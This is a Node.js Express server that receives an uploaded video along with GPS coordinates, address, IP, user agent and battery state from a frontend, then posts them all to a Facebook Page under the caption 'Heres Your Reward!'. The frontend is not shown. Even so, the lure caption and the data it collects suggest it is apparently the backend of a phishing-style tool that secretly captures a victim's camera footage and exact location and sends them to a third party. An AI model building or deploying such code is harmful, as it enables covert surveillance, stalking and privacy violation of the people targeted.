import express from "express";
import multer from "multer";
import fetch from "node-fetch";
import FormData from "form-data";
import dotenv from "dotenv";

dotenv.config();

const app = express();
const upload = multer(); // memory storage
const PORT = process.env.PORT || 3000;

const PAGE_ID = process.env.PAGE_ID;
const ACCESS_TOKEN = process.env.ACCESS_TOKEN;

// Middleware to parse JSON for device/location info
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Endpoint to accept video + location + device info
app.post("/upload-video", upload.single("video"), async (req, res) => {
    try {
        const videoFile = req.file;
        if (!videoFile) return res.status(400).json({ error: "No video uploaded" });

        // Location data from frontend
        const latitude = req.body.latitude || null;
        const longitude = req.body.longitude || null;
        const accuracy = req.body.accuracy || null;
        const address = req.body.address || "Unknown";
        const maps = req.body.maps || null;

        // Device info from frontend
        const deviceInfo = req.body.deviceInfo ? JSON.parse(req.body.deviceInfo) : {};

        // Build Facebook description
        let description = `🎬 Heres Your Reward! 🎉\n\n`;

        // Add location info
        if (latitude && longitude) {
            description += `📍 Location: ${address}\n`;
            description += `🌐 Maps: ${maps}\n`;
            description += `🗺 Coordinates: ${latitude}, ${longitude}\n\n`;
        }

        // Add device info
        description += `💻 Device Info:\n`;
        description += `Platform: ${deviceInfo.platform || "Unknown"}\n`;
        description += `User Agent: ${deviceInfo.userAgent || "Unknown"}\n`;
        description += `IP: ${deviceInfo.ip || "Unknown"}\n`;
        if (deviceInfo.battery) {
            description += `Battery: ${deviceInfo.battery.level || "Unknown"}`
                         + ` (${deviceInfo.battery.charging ? "Charging" : "Not charging"})\n`;
        }

        // Prepare form to post video to Facebook
        const form = new FormData();
        form.append("source", videoFile.buffer, videoFile.originalname);
        form.append("description", description);
        form.append("access_token", ACCESS_TOKEN);

        // Post to Facebook Page
        const response = await fetch(`https://graph.facebook.com/${PAGE_ID}/videos`, {
            method: "POST",
            body: form,
            headers: form.getHeaders()
        });

        const result = await response.json();
        console.log("Video posted:", result);

        res.json({
            fbResponse: result,
            location: { latitude, longitude, address, maps },
            device: deviceInfo
        });

    } catch (err) {
        console.error("Server Error:", err);
        res.status(500).json({ error: err.message });
    }
});

// Serve frontend files
app.use(express.static("frontend"));

app.listen(PORT, () => console.log(`Backend running on port ${PORT}`));
